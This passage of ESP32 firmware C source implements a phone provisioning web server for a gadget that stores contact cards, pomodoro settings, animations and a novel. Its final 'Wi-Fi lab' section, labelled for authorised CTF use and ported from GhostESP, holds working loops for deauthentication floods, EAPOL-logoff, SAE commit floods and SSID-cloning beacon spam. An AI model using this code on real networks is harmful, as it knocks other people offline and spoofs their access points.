    app_badge_list_t *list = app_state_badges();
    if (!list || list->count <= 0) {
        return prov_reply(req, "请先在上面的“名片与二维码”里保存一张名片，再生成联系人二维码");
    }

    char num[12];
    int index = form_field(body, "idx", num, sizeof(num)) ? atoi(num) - 1 : 0;
    if (index < 0 || index >= list->count) index = 0;
    int slot = form_field(body, "slot", num, sizeof(num)) ? atoi(num) - 1 : 0;
    if (slot < 0) slot = 0;
    if (slot >= APP_BADGE_QR_MAX) slot = APP_BADGE_QR_MAX - 1;

    app_vcard_t card;
    memset(&card, 0, sizeof(card));
    vcard_take(body, "name", card.name, sizeof(card.name));
    vcard_take(body, "org", card.org, sizeof(card.org));
    vcard_take(body, "title", card.title, sizeof(card.title));
    vcard_take(body, "tel", card.tel, sizeof(card.tel));
    vcard_take(body, "email", card.email, sizeof(card.email));
    vcard_take(body, "url", card.url, sizeof(card.url));

    if (!card.name[0]) {
        httpd_resp_set_status(req, "400 Bad Request");
        return prov_reply(req, "请填写姓名");
    }

    // 二维码上限 120 字节，多出的长度会被 app_badge_qr_* 拒绝，因此这里就按上限生成。
    char text[APP_QR_MAX_BYTES + 1];
    int dropped = 0;
    if (app_vcard_build(&card, text, sizeof(text), &dropped) < 0) {
        return prov_reply(req, "名片内容放不下，请精简姓名、电话或邮箱");
    }

    app_badge_t *b = &list->items[index];
    int before = b->qr_count;
    bool ok = (slot < before) ? app_badge_qr_set(b, slot, "名片", text)
                              : (app_badge_qr_add(b, "名片", text) >= 0);
    if (!ok) {
        return prov_reply(req, "二维码写入失败，请检查姓名是否含非法字符");
    }
    int actual = (slot < before) ? slot : (b->qr_count - 1);
    app_state_save_badges();

    char msg[160];
    if (dropped > 0) {
        snprintf(msg, sizeof(msg),
                 "已生成第 %d 张名片第 %d 位二维码；为放下内容省略了 %d 个字段（按网址、职务、单位顺序）",
                 index + 1, actual + 1, dropped);
    } else {
        snprintf(msg, sizeof(msg), "已生成第 %d 张名片第 %d 位二维码", index + 1, actual + 1);
    }
    return prov_reply(req, msg);
}

static esp_err_t prov_post_pomo(httpd_req_t *req)
{
    char body[256];
    if (!read_form_checked(req, body, sizeof(body))) {
        httpd_resp_set_status(req, "400 Bad Request");
        return prov_reply(req, "内容为空或过长");
    }

    app_pomodoro_t *p = app_state_pomodoro();
    char tmp[12];
    int focus = p->focus_minutes;
    int brk = p->break_minutes;
    int lng = p->long_break_minutes;
    int cycles = p->cycles_per_long_break;

    if (form_field(body, "focus", tmp, sizeof(tmp))) focus = atoi(tmp);
    if (form_field(body, "brk", tmp, sizeof(tmp))) brk = atoi(tmp);
    if (form_field(body, "long", tmp, sizeof(tmp))) lng = atoi(tmp);
    if (form_field(body, "cycles", tmp, sizeof(tmp))) cycles = atoi(tmp);
    // 复选框未勾选时浏览器不会提交该字段，因此"字段缺失"就是"关闭"，不能用旧值兜底。
    bool auto_next = form_field(body, "auto", tmp, sizeof(tmp)) && atoi(tmp) != 0;
    bool dnd = form_field(body, "dnd", tmp, sizeof(tmp)) && atoi(tmp) != 0;

    bool durations_ok = app_pomodoro_set_durations(p, focus, brk);
    bool long_ok = app_pomodoro_set_long_break(p, lng, cycles);
    app_pomodoro_set_auto_next(p, auto_next);
    app_pomodoro_set_dnd(p, dnd);
    app_state_save_pomodoro();

    if (p->state != APP_POMO_IDLE && !durations_ok && !long_ok) {
        return prov_reply(req, "番茄钟正在计时：时长与循环次数未修改，请先在设备上停止计时；自动接续与免打扰已保存");
    }
    return prov_reply(req, "番茄钟设置已保存（自动接续与免打扰已同步）");
}

// 动图上传：手机端解码并缩放，设备只收 RGB565 帧序列。请求体是纯二进制，参数走
// 查询串，于是设备端可以边收边写，不必把整段动图放进内存。
static esp_err_t prov_post_anim(httpd_req_t *req)
{
    if (!app_assets_ready()) {
        return prov_reply(req, "设备的动图资源分区不可用，无法保存动图");
    }

    char query[256];
    char val[64];
    if (httpd_req_get_url_query_str(req, query, sizeof(query)) != ESP_OK) {
        httpd_resp_set_status(req, "400 Bad Request");
        return prov_reply(req, "缺少上传参数");
    }

    int slot = query_int(query, "slot", -1);
    int w = query_int(query, "w", 0);
    int h = query_int(query, "h", 0);
    int frames = query_int(query, "frames", 0);
    int ms = query_int(query, "ms", APP_ANIM_FRAME_MS_DEFAULT);

    char name[APP_ANIM_NAME_LEN];
    name[0] = '\0';
    if (httpd_query_key_value(query, "name", val, sizeof(val)) == ESP_OK) {
        url_decode(val);
        copy_trunc(name, sizeof(name), val);
    }

    int total = req->content_len;
    app_anim_status_t vst = app_anim_validate(w, h, frames, (uint32_t)total);
    if (vst != APP_ANIM_OK) {
        httpd_resp_set_status(req, "400 Bad Request");
        char msg[128];
        snprintf(msg, sizeof(msg), "参数不合法：%s（宽高上限 %d，帧数上限 %d）",
                 app_anim_status_text(vst), APP_ANIM_MAX_SIDE, APP_ANIM_MAX_FRAMES);
        return prov_reply(req, msg);
    }

    app_anim_meta_t meta = {
        .width = (uint16_t)w,
        .height = (uint16_t)h,
        .frame_count = (uint16_t)frames,
        .frame_ms = app_anim_frame_ms_clamp(ms),
    };
    app_assets_writer_t writer;
    esp_err_t err = app_assets_write_begin(&writer, slot, &meta, name, (uint32_t)total);
    if (err != ESP_OK) {
        httpd_resp_set_status(req, "400 Bad Request");
        return prov_reply(req, "槽位不可写：槽号越界或数据超过槽位容量");
    }

    uint8_t chunk[2048];
    int got = 0;
    while (got < total) {
        int r = httpd_req_recv(req, (char *)chunk, sizeof(chunk));
        if (r == HTTPD_SOCK_ERR_TIMEOUT) continue;
        if (r <= 0 || app_assets_write_chunk(&writer, chunk, (size_t)r) != ESP_OK) {
            app_assets_write_abort(&writer);
            httpd_resp_set_status(req, "400 Bad Request");
            return prov_reply(req, "上传中断，已放弃写入（原动图已被清除）");
        }
        got += r;
    }

    if (app_assets_write_commit(&writer) != ESP_OK) {
        return prov_reply(req, "写入校验失败，请重新上传");
    }

    char msg[128];
    snprintf(msg, sizeof(msg), "动图已保存到槽位 %d：%dx%d，%d 帧，每帧 %u 毫秒",
             slot, w, h, frames, (unsigned)meta.frame_ms);
    return prov_reply(req, msg);
}

// ---------------------------------------------------------------------------
// 小说：上传 / 删除
// ---------------------------------------------------------------------------
// 正文可能接近 1MB，若走表单编码会被膨胀成两三倍，因此约定"正文走请求体原文
// （text/plain），书名走查询参数"。设备端边收边写闪存，不把整本书放进内存。

static esp_err_t prov_post_novel(httpd_req_t *req)
{
    if (!app_novel_ready()) {
        httpd_resp_set_status(req, "503 Service Unavailable");
        return prov_reply(req, "小说分区不可用，无法保存");
    }

    int total = req->content_len;
    if (total <= 0) {
        httpd_resp_set_status(req, "400 Bad Request");
        return prov_reply(req, "没有收到正文");
    }
    if ((uint32_t)total > app_novel_capacity()) {
        httpd_resp_set_status(req, "413 Payload Too Large");
        char msg[128];
        snprintf(msg, sizeof(msg), "正文 %d 字节，超过设备上限 %u 字节（约 %u KB）",
                 total, (unsigned)app_novel_capacity(),
                 (unsigned)(app_novel_capacity() / 1024));
        return prov_reply(req, msg);
    }

    char title[64] = { 0 };
    char query[256];
    if (httpd_req_get_url_query_str(req, query, sizeof(query)) == ESP_OK) {
        char val[128];
        if (httpd_query_key_value(query, "title", val, sizeof(val)) == ESP_OK) {
            url_decode(val);
            copy_trunc(title, sizeof(title), val);
        }
    }

    app_novel_writer_t writer;
    esp_err_t err = app_novel_write_begin(&writer, title, (uint32_t)total);
    if (err != ESP_OK) {
        httpd_resp_set_status(req, "400 Bad Request");
        return prov_reply(req, "无法开始写入：容量或书名不合法");
    }

    // 一次 2KB：与动图上传一致，既够快也不会顶到 httpd 任务的栈。
    char *chunk = (char *)malloc(2048);
    if (!chunk) {
        app_novel_write_abort(&writer);
        httpd_resp_set_status(req, "500 Internal Server Error");
        return prov_reply(req, "设备内存不足，请重试");
    }

    int got = 0;
    while (got < total) {
        int r = httpd_req_recv(req, chunk, 2048);
        if (r == HTTPD_SOCK_ERR_TIMEOUT) continue;
        if (r <= 0 || app_novel_write_chunk(&writer, chunk, (size_t)r) != ESP_OK) {
            free(chunk);
            app_novel_write_abort(&writer);
            httpd_resp_set_status(req, "400 Bad Request");
            return prov_reply(req, "上传中断或正文不是合法 UTF-8，已放弃（原小说已被清除）");
        }
        got += r;
    }
    free(chunk);

    if (app_novel_write_commit(&writer) != ESP_OK) {
        return prov_reply(req, "写入校验失败，请重新上传");
    }

    char msg[160];
    snprintf(msg, sizeof(msg), "小说已保存：%s（%d KB，%d 章）",
             title[0] ? title : "(未命名)", (total + 512) / 1024,
             app_novel_chapter_count());
    prov_set_note("小说已更新");
    return prov_reply(req, msg);
}

static esp_err_t prov_post_novel_del(httpd_req_t *req)
{
    if (app_novel_erase() != ESP_OK) {
        return prov_reply(req, "删除失败，请重试");
    }
    app_state_set_novel_pos(0, 0);
    prov_set_note("小说已删除");
    return prov_reply(req, "小说已删除");
}

// 页面初始化时一次性取回设备端状态：动图槽位、密码本摘要、口令账户、番茄钟参数与
// 统计。密码本只给"名称 + 账号"、口令只给备注名——网页不是查看口令的地方，这样手机
// 被别人拿到也看不到敏感内容。
static esp_err_t prov_get_info(httpd_req_t *req)
{
    const size_t cap = 8192;
    char *buf = (char *)malloc(cap);
    if (!buf) {
        httpd_resp_set_status(req, "500 Internal Server Error");
        return prov_reply(req, "设备内存不足，请重试");
    }
    size_t used = 0;
    buf[0] = '\0';
    char tmp[192];

    buf_append(buf, cap, &used, "{\"anim\":{\"ready\":");
    buf_append(buf, cap, &used, app_assets_ready() ? "true" : "false");
    snprintf(tmp, sizeof(tmp), ",\"slots\":%d,\"used\":%d,\"items\":[",
             APP_ANIM_SLOT_MAX, app_assets_used_slots());
    buf_append(buf, cap, &used, tmp);

    for (int i = 0; i < APP_ANIM_SLOT_MAX; i++) {
        app_anim_header_t h;
        if (i) buf_append(buf, cap, &used, ",");
        if (app_assets_slot_header(i, &h) == ESP_OK) {
            char name[APP_ANIM_NAME_LEN];
            app_anim_name_copy(&h, name, sizeof(name));
            snprintf(tmp, sizeof(tmp),
                     "{\"slot\":%d,\"used\":true,\"w\":%u,\"h\":%u,\"frames\":%u,\"ms\":%u,\"name\":",
                     i, (unsigned)h.width, (unsigned)h.height,
                     (unsigned)h.frame_count, (unsigned)app_anim_frame_ms_get(&h));
            buf_append(buf, cap, &used, tmp);
            json_append_str(buf, cap, &used, name);
            buf_append(buf, cap, &used, "}");
        } else {
            snprintf(tmp, sizeof(tmp), "{\"slot\":%d,\"used\":false}", i);
            buf_append(buf, cap, &used, tmp);
        }
    }
    buf_append(buf, cap, &used, "]},");

    app_vault_t *v = app_state_vault();
    int vault_count = v->count;
    buf_append(buf, cap, &used, "\"vault\":{\"encrypted\":");
    buf_append(buf, cap, &used, app_vault_is_encrypted(v) ? "true" : "false");
    buf_append(buf, cap, &used, ",\"locked\":");
    buf_append(buf, cap, &used, app_vault_is_locked(v) ? "true" : "false");
    buf_append(buf, cap, &used, ",\"mode\":");
    json_append_str(buf, cap, &used, app_vault_mode_name(v->mode));
    snprintf(tmp, sizeof(tmp), ",\"count\":%d,\"entries\":[", vault_count);
    buf_append(buf, cap, &used, tmp);

    bool first = true;
    for (int i = 0; i < vault_count; i++) {
        const app_vault_entry_t *e = app_vault_at(v, i);
        if (!e) continue;
        if (!first) buf_append(buf, cap, &used, ",");
        first = false;
        snprintf(tmp, sizeof(tmp), "{\"i\":%d,\"label\":", i + 1);
        buf_append(buf, cap, &used, tmp);
        json_append_str(buf, cap, &used, e->label);
        buf_append(buf, cap, &used, ",\"account\":");
        json_append_str(buf, cap, &used, e->account);
        buf_append(buf, cap, &used, "}");
    }
    buf_append(buf, cap, &used, "]},");

    int totp_count = app_state_totp_count();
    snprintf(tmp, sizeof(tmp), "\"totp\":{\"max\":%d,\"count\":%d,\"items\":[",
             APP_TOTP_MAX_ACCOUNTS, totp_count);
    buf_append(buf, cap, &used, tmp);
    first = true;
    for (int i = 0; i < totp_count; i++) {
        const app_totp_account_t *a = app_state_totp_at(i);
        if (!a) continue;
        if (!first) buf_append(buf, cap, &used, ",");
        first = false;
        snprintf(tmp, sizeof(tmp), "{\"i\":%d,\"label\":", i + 1);
        buf_append(buf, cap, &used, tmp);
        json_append_str(buf, cap, &used, a->label);
        buf_append(buf, cap, &used, "}");
    }
    buf_append(buf, cap, &used, "]},");

    app_pomodoro_t *p = app_state_pomodoro();
    snprintf(tmp, sizeof(tmp),
             "\"pomodoro\":{\"focus\":%d,\"brk\":%d,\"long\":%d,\"cycles\":%d,\"auto\":%s,\"dnd\":%s,"
             "\"today_min\":%d,\"today_sessions\":%d,\"total_sessions\":%d,\"total_min\":%d,\"state\":",
             p->focus_minutes, p->break_minutes, p->long_break_minutes, p->cycles_per_long_break,
             p->auto_next ? "true" : "false", p->do_not_disturb ? "true" : "false",
             p->focus_minutes_today, p->today_sessions,
             p->total_focus_sessions, p->total_focus_minutes);
    buf_append(buf, cap, &used, tmp);
    json_append_str(buf, cap, &used, app_pomodoro_state_name(p->state));
    buf_append(buf, cap, &used, "},");

    buf_append(buf, cap, &used, "\"novel\":{\"present\":");
    buf_append(buf, cap, &used, app_novel_present() ? "true" : "false");
    app_novel_header_t novel_hdr;
    if (app_novel_header(&novel_hdr) == ESP_OK) {
        snprintf(tmp, sizeof(tmp), ",\"bytes\":%u,\"chapters\":%u,\"title\":",
                 (unsigned)novel_hdr.data_bytes, (unsigned)novel_hdr.chapter_count);
        buf_append(buf, cap, &used, tmp);
        json_append_str(buf, cap, &used, novel_hdr.title);
    }
    buf_append(buf, cap, &used, "},");

    snprintf(tmp, sizeof(tmp), "\"badge\":{\"count\":%d,\"selected\":%d}}",
             app_state_badges()->count, app_state_badge_selected());
    buf_append(buf, cap, &used, tmp);

    httpd_resp_set_type(req, "application/json; charset=utf-8");
    esp_err_t err = httpd_resp_send(req, buf, HTTPD_RESP_USE_STRLEN);
    free(buf);
    return err;
}

static void fill_ap_config(wifi_config_t *ap)
{
    memset(ap, 0, sizeof(*ap));
    size_t n = strlen(PROV_SSID);
    if (n > sizeof(ap->ap.ssid)) n = sizeof(ap->ap.ssid);
    memcpy(ap->ap.ssid, PROV_SSID, n);
    ap->ap.ssid_len = (uint8_t)n;
    strncpy((char *)ap->ap.password, PROV_PASS, sizeof(ap->ap.password) - 1);
    ap->ap.channel = 1;
    // 配网页只需同时服务一台手机。参考 softap-provisioning-and-resource-budget.md：
    // 单人配置页的实测保守起点是 max_connection=1，调大要等实测过堆与 socket 占用。
    // 原来的 4 会让 AP 预留更多每站资源，在无 PSRAM 的 C3 上直接吃掉配网要用的连续内存。
    ap->ap.max_connection = 1;
    ap->ap.authmode = WIFI_AUTH_WPA2_PSK;
    ap->ap.pmf_cfg.required = false;
}

// 热点配网是整块固件里最吃连续内存的一步：httpd 要一块 6144 字节的任务栈，外加
// socket 与 lwIP 缓冲。无 PSRAM 的板子上碎片化比"空闲总量"更致命，所以失败时必须
// 打出"最大连续块"，否则日志里只剩一句"起不来"。
static void log_prov_heap(const char *stage)
{
    ESP_LOGI(TAG, "配网[%s] 空闲堆 %u 字节，最大连续块 %u 字节", stage,
             (unsigned)esp_get_free_heap_size(),
             (unsigned)heap_caps_get_largest_free_block(MALLOC_CAP_8BIT));
}

// "内存不足"时给用户一个明确出口：长按下键触发一次清理再重试。这里只放掉可再生的
// 东西——赛区/积分榜缓存重新联网即可再取，蓝牙角色与热点抢同一路射频且各占一份
// 可观的协议栈，用异步请求停掉（协议栈在它自己的 worker 里释放，不阻塞界面）。
size_t app_net_prov_reclaim_memory(void)
{
    uint32_t before = esp_get_free_heap_size();

    net_lock();
    s_league_count = 0;
    s_leagues_running = false;
    s_standings_running = false;
    net_unlock();

    app_ble_finder_request_stop();
    app_ble_remote_request_stop();

    uint32_t after = esp_get_free_heap_size();
    log_prov_heap("手动清理后");
    return (size_t)(after > before ? after - before : 0);
}

// 本次 app_net_prov_start() 是否由它自己打开了射频。回滚时只有这一种情况才允许关
// Wi-Fi：否则会把 STA 连接或赛事中心正在用的射频一起关掉。
static bool s_prov_opened_wifi;

// 配网启动失败后的回滚。原实现每个失败点都直接 return，把 APSTA 模式、AP 配置和
// s_wifi_started=true 全留在原地，形成"射频已开但配网未激活"的脏状态；下一次
// wifi_ensure_started() 又因 s_wifi_started 短路成成功，于是重试跳过配置直接进
// httpd_start，而堆比上次更差——结果就是"每次都开不起来"，重试永远无效。
static void prov_rollback(esp_err_t err)
{
    if (s_httpd) {
        httpd_stop(s_httpd);
        s_httpd = NULL;
    }

    if (s_wifi_started) {
        if (s_prov_opened_wifi && !s_sta_wanted) {
            // 射频正是本次为配网拉起来的，且没人在用：完整释放，让重试从干净状态开始。
            esp_wifi_disconnect();
            esp_wifi_stop();
            s_wifi_started = false;
            if (s_wifi_inited) {
                esp_wifi_deinit();
                s_wifi_inited = false;
            }
            app_state_set_net(APP_NET_OFF, NULL);
        } else {
            // 射频本来就开着：只退回纯 STA，不关它。
            esp_wifi_set_mode(WIFI_MODE_STA);
        }
    }
    s_prov_opened_wifi = false;
    s_prov_note[0] = '\0';
    ESP_LOGE(TAG, "配网启动失败已回滚: %s", esp_err_to_name(err));
}

esp_err_t app_net_prov_start(void)
{
    if (!s_inited) return ESP_ERR_INVALID_STATE;
    // 已经在配网直接算成功。注意不能只信 s_prov_active：失败路径会把它留成 false，
    // 而射频与 AP 配置可能已经被本函数改过（见 prov_rollback）。
    if (s_prov_active) return ESP_OK;
    if (!s_ap_netif) return ESP_ERR_INVALID_STATE;

    // 射频互斥：Wi-Fi 实验正占着 2.4G 射频，不能叠加配网（配网需要 AP 模式、会改射频）。
    if (app_net_wifilab_running()) {
        ESP_LOGW(TAG, "Wi-Fi 实验正在发射，暂不能开启配网");
        return ESP_ERR_INVALID_STATE;
    }

    log_prov_heap("开启前");

    // 记录进来时射频是否已经开着：决定失败时能不能把射频整个关掉。
    s_prov_opened_wifi = !s_wifi_started;

    esp_err_t err = wifi_ensure_started();
    if (err != ESP_OK) {
        ESP_LOGE(TAG, "配网 Wi-Fi 启动失败: %s", esp_err_to_name(err));
        // wifi_ensure_started 内部没有留下半启动状态，这里只需清标志。
        s_prov_opened_wifi = false;
        return err;
    }
    log_prov_heap("射频启动后");

    // 依次切 APSTA、配 AP 参数、起配置网页。任一步失败都走统一回滚，不把半配置状态
    // 留给下一次重试。
    err = esp_wifi_set_mode(WIFI_MODE_APSTA);
    if (err == ESP_OK) {
        wifi_config_t ap_cfg;
        fill_ap_config(&ap_cfg);
        err = esp_wifi_set_config(WIFI_IF_AP, &ap_cfg);
    }
    if (err != ESP_OK) {
        ESP_LOGE(TAG, "配网 AP 配置失败: %s", esp_err_to_name(err));
        prov_rollback(err);
        return err;
    }
    log_prov_heap("AP 配置后");

    httpd_config_t hc = HTTPD_DEFAULT_CONFIG();
    hc.max_uri_handlers = 18;
    hc.lru_purge_enable = true;
    hc.stack_size = 6144;
    // 默认 7 个并发 socket，每个都要 lwIP 收发缓冲，在无 PSRAM 的板子上是配网启动
    // 失败的主因之一。手机配置页正常只需 1-2 条连接，留 4 条并配合 lru_purge 足够；
    // 旧连接会被自动回收，不会出现"网页打不开"。
    hc.max_open_sockets = 4;
    hc.backlog_conn = 2;
    err = httpd_start(&s_httpd, &hc);
    if (err != ESP_OK) {
        s_httpd = NULL;
        // 把错误码和最大连续块一起打出来：内存不足是这里最常见的失败原因，而日志只
        // 写"启动失败"时无法判断到底该减功能还是该查内存。
        ESP_LOGE(TAG, "配网网页启动失败: %s（最大连续块 %u 字节）",
                 esp_err_to_name(err),
                 (unsigned)heap_caps_get_largest_free_block(MALLOC_CAP_8BIT));
        prov_rollback(err);
        return err;
    }
    log_prov_heap("配置网页启动后");

    const httpd_uri_t uris[] = {
        { .uri = "/",           .method = HTTP_GET,  .handler = prov_get_root,        .user_ctx = NULL },
        { .uri = "/wifi",       .method = HTTP_POST, .handler = prov_post_wifi,       .user_ctx = NULL },
        { .uri = "/time",       .method = HTTP_POST, .handler = prov_post_time,       .user_ctx = NULL },
        { .uri = "/totp",       .method = HTTP_POST, .handler = prov_post_totp,       .user_ctx = NULL },
        { .uri = "/routine",    .method = HTTP_POST, .handler = prov_post_routine,    .user_ctx = NULL },
        { .uri = "/info",       .method = HTTP_GET,  .handler = prov_get_info,        .user_ctx = NULL },
        { .uri = "/vault",      .method = HTTP_POST, .handler = prov_post_vault,      .user_ctx = NULL },
        { .uri = "/vault_del",  .method = HTTP_POST, .handler = prov_post_vault_del,  .user_ctx = NULL },
        { .uri = "/vault_unlock",.method = HTTP_POST,.handler = prov_post_vault_unlock,.user_ctx = NULL },
        { .uri = "/totp_secret",.method = HTTP_POST, .handler = prov_post_totp_secret,.user_ctx = NULL },
        { .uri = "/totp_del",   .method = HTTP_POST, .handler = prov_post_totp_del,   .user_ctx = NULL },
        { .uri = "/badge",      .method = HTTP_POST, .handler = prov_post_badge,      .user_ctx = NULL },
        { .uri = "/vcard",      .method = HTTP_POST, .handler = prov_post_vcard,      .user_ctx = NULL },
        { .uri = "/pomo",       .method = HTTP_POST, .handler = prov_post_pomo,       .user_ctx = NULL },
        { .uri = "/anim",       .method = HTTP_POST, .handler = prov_post_anim,       .user_ctx = NULL },
        { .uri = "/novel",      .method = HTTP_POST, .handler = prov_post_novel,      .user_ctx = NULL },
        { .uri = "/novel_del",  .method = HTTP_POST, .handler = prov_post_novel_del,  .user_ctx = NULL },
    };
    const size_t uri_n = sizeof(uris) / sizeof(uris[0]);
    // max_uri_handlers 必须真的够用：注册失败的 URI 在手机上就是 404，而 UI 不会报错。
    if (uri_n > (size_t)hc.max_uri_handlers) {
        ESP_LOGE(TAG, "配网页 URI %u 个超过 max_uri_handlers %u",
                 (unsigned)uri_n, (unsigned)hc.max_uri_handlers);
    }
    for (size_t i = 0; i < uri_n; i++) {
        esp_err_t rerr = httpd_register_uri_handler(s_httpd, &uris[i]);
        if (rerr != ESP_OK) {
            ESP_LOGE(TAG, "注册 %s 失败: %s", uris[i].uri, esp_err_to_name(rerr));
        }
    }

    // 到这里才算真正开起来了：此时才把 s_prov_opened_wifi 的意义确定为"本次配网
    // 持有射频"，供 app_net_prov_stop() 与回滚判断。
    net_lock();
    s_prov_active = true;
    s_prov_note[0] = '\0';
    net_unlock();

    ESP_LOGI(TAG, "配网已开启: SSID=%s URL=%s", PROV_SSID, PROV_URL);
    return ESP_OK;
}

void app_net_prov_stop(void)
{
    // 显式停止也要清掉"射频由配网拉起"的标记，否则下一次启动会误判射频已经是热的，
    // 失败回滚时就不会去关它，脏状态继续累积。
    s_prov_opened_wifi = false;

    if (!s_prov_active && !s_httpd) return;

    if (s_httpd) {
        httpd_stop(s_httpd);
        s_httpd = NULL;
    }

    net_lock();
    bool was_active = s_prov_active;
    s_prov_active = false;
    net_unlock();

    if (!was_active) return;

    if (s_sta_wanted) {
        // 用户本就想要 STA 连接，退回纯 STA 模式即可。
        if (s_wifi_started) esp_wifi_set_mode(WIFI_MODE_STA);
    } else if (s_wifi_started) {
        esp_wifi_stop();
        s_wifi_started = false;
        if (s_wifi_inited) {
            esp_wifi_deinit();
            s_wifi_inited = false;
        }
        app_state_set_net(APP_NET_OFF, NULL);
    }
}

bool app_net_prov_active(void)
{
    net_lock();
    bool active = s_prov_active;
    net_unlock();
    return active;
}

const char *app_net_prov_ssid(void) { return PROV_SSID; }
const char *app_net_prov_pass(void) { return PROV_PASS; }
const char *app_net_prov_url(void)  { return PROV_URL; }

const char *app_net_prov_note(void)
{
    net_lock();
    bool has = s_prov_note[0] != '\0';
    net_unlock();
    return has ? s_prov_note : NULL;
}

// ---------------------------------------------------------------------------
// Wi-Fi 实验（仅自有 / 授权环境：CTF / 实验室无线测试）
// ---------------------------------------------------------------------------
// 把 logic/app_wifilab 算好的原始 802.11 帧通过 esp_wifi_80211_tx 发射。本角色与信道体检、
// 任意蓝牙角色、热点配网共用一路 2.4G 射频，硬互斥（见各 start 的拒绝判断）。start/stop
// 阻塞式，只由下方常驻 worker 串行调用；界面只发异步请求、读状态。
//
// 移植来源：用户自有、公开的 GhostESP（main/managers/wifi_manager.c）。攻击方式、帧字节、
// 逐信道 / 逐 AP 的发射节奏都按原样复刻，未做"射程 / 隐蔽 / 选靶"上的改动。

static void set_wifilab_reason(const char *text)
{
    if (text) snprintf(s_wifilab_reason, sizeof(s_wifilab_reason), "%s", text);
}

// 统计一次发射结果。只有 esp_wifi_80211_tx 返回 ESP_OK 才算"驱动已接受这一帧"：
// 之前这里不看返回值、无条件累加，界面上的帧数只等于循环次数，会让人误以为帧已经上了
// 空口。失败要计数，并把首个错误码留给界面——设备上拿不到日志时，这是唯一的排查入口。
static void wifilab_count_tx(esp_err_t err)
{
    if (err == ESP_OK) {
        s_wifilab_sent++;
        return;
    }

    s_wifilab_failed++;
    if (s_wifilab_tx_err == ESP_OK) {
        // 先写好给人看的字符串，再落错误码：界面线程只读字符串，不会看到"半截"状态。
        snprintf(s_wifilab_tx_reason, sizeof(s_wifilab_tx_reason), "%s",
                 esp_err_to_name(err));
        s_wifilab_tx_err = err;
        ESP_LOGE(TAG, "Wi-Fi 实验发射被拒: %s", esp_err_to_name(err));
    }
}

// 攻击循环：根据当前模式把构造好的帧逐包发射，直到 s_wifilab_active 被清。
static void wifilab_attack_task(void *arg)
{
    (void)arg;

    uint8_t frame[256];
    size_t len = 0;
    const uint8_t broadcast[6] = { 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF };

    switch (s_wifilab_mode) {
    case APP_WIFILAB_DEAUTH: {
        uint8_t deauth[26], disassoc[26];
        while (s_wifilab_active) {
            if (s_wifilab_channel >= 1 && s_wifilab_channel <= 13) {
                esp_wifi_set_channel((uint8_t)s_wifilab_channel, WIFI_SECOND_CHAN_NONE);
            }
            // 广播去认证 / 去关联（AP -> 站点方向，目的=广播），与 GhostESP 的默认行为一致。
            app_wifilab_build_deauth(deauth, sizeof(deauth), s_wifilab_bssid, broadcast, 7, &len);
            wifilab_count_tx(esp_wifi_80211_tx(WIFI_IF_AP, deauth, (int)len, false));
            app_wifilab_build_disassoc(disassoc, sizeof(disassoc), s_wifilab_bssid, broadcast, 7, &len);
            wifilab_count_tx(esp_wifi_80211_tx(WIFI_IF_AP, disassoc, (int)len, false));
            vTaskDelay(pdMS_TO_TICKS(5));
        }
        break;
    }

    case APP_WIFILAB_EAPOL_LOGOFF: {
        // 无已发现站点时退化为随机站点 MAC（与 GhostESP 的 "no stations found" 路径一致）。
        uint8_t fake_sta[6];
        app_wifilab_random_mac(fake_sta);
        while (s_wifilab_active) {
            if (s_wifilab_channel >= 1 && s_wifilab_channel <= 13) {
                esp_wifi_set_channel((uint8_t)s_wifilab_channel, WIFI_SECOND_CHAN_NONE);
            }
            app_wifilab_build_eapol_logoff(frame, sizeof(frame), s_wifilab_bssid, fake_sta, &len);
            wifilab_count_tx(esp_wifi_80211_tx(WIFI_IF_AP, frame, (int)len, false));
            vTaskDelay(pdMS_TO_TICKS(10));   // eapol_attack_delay_ms 默认 10
        }
        break;
    }

    case APP_WIFILAB_SAE_FLOOD: {
        uint8_t base[6];
        if (esp_wifi_get_mac(WIFI_IF_STA, base) != ESP_OK) memset(base, 0, sizeof(base));
        uint8_t spoof[6];
        uint16_t fc = 0;
        while (s_wifilab_active) {
            if (s_wifilab_channel >= 1 && s_wifilab_channel <= 13) {
                esp_wifi_set_channel((uint8_t)s_wifilab_channel, WIFI_SECOND_CHAN_NONE);
            }
            memcpy(spoof, base, 6);
            spoof[4] = (uint8_t)((fc >> 8) & 0xFF);
            spoof[5] = (uint8_t)(fc & 0xFF);
            app_wifilab_build_sae_commit(frame, sizeof(frame), s_wifilab_bssid, spoof, fc, &len);
            wifilab_count_tx(esp_wifi_80211_tx(WIFI_IF_STA, frame, (int)len, false));
            fc = (uint16_t)((fc + 1) % 65536);
            vTaskDelay(pdMS_TO_TICKS(10));   // 约 100 帧/秒
        }
        break;
    }

    case APP_WIFILAB_BEACON_SPAM: {
        int rick_idx = 0;
        while (s_wifilab_active) {
            if (s_wifilab_beacon == APP_WIFILAB_BEACON_AP_LIST) {
                // 把最近一次信道体检扫描到的 AP 的 SSID 逐信道广播（与 GhostESP 的 APLISTMODE 一致）。
                const app_channel_report_t *r = app_net_channel_report();
                if (r) {
                    for (int i = 0; i < r->stored; i++) {
                        const app_channel_ap_t *ap = &r->aps[i];
                        int ch = ap->channel;
                        if (ch < 1 || ch > 13) ch = 1;
                        esp_wifi_set_channel((uint8_t)ch, WIFI_SECOND_CHAN_NONE);
                        int sl = 0;
                        while ((size_t)sl < sizeof(ap->ssid) && ap->ssid[sl] != '\0') sl++;
                        app_wifilab_build_beacon(frame, sizeof(frame), APP_WIFILAB_BEACON_AP_LIST,
                                                 ap->ssid, (size_t)sl, ap->bssid, ch, &len);
                        wifilab_count_tx(esp_wifi_80211_tx(WIFI_IF_AP, frame, (int)len, false));
                        vTaskDelay(pdMS_TO_TICKS(10));
                        if (!s_wifilab_active) break;
                    }
                }
            } else {
                // RANDOM / RICKROLL：逐信道 1..11 广播（与 GhostESP wifi_manager_broadcast_ap 一致）。
                for (int ch = APP_WIFILAB_BEACON_CHANNEL_MIN;
                     ch <= APP_WIFILAB_BEACON_CHANNEL_MAX; ch++) {
                    esp_wifi_set_channel((uint8_t)ch, WIFI_SECOND_CHAN_NONE);
                    if (s_wifilab_beacon == APP_WIFILAB_BEACON_RICKROLL) {
                        const char *lyric = app_wifilab_rickroll_line(rick_idx++);
                        app_wifilab_build_beacon(frame, sizeof(frame), APP_WIFILAB_BEACON_RICKROLL,
                                                 lyric, strlen(lyric), NULL, ch, &len);
                    } else {
                        app_wifilab_build_beacon(frame, sizeof(frame), APP_WIFILAB_BEACON_RANDOM,
                                                 NULL, 0, NULL, ch, &len);
                    }
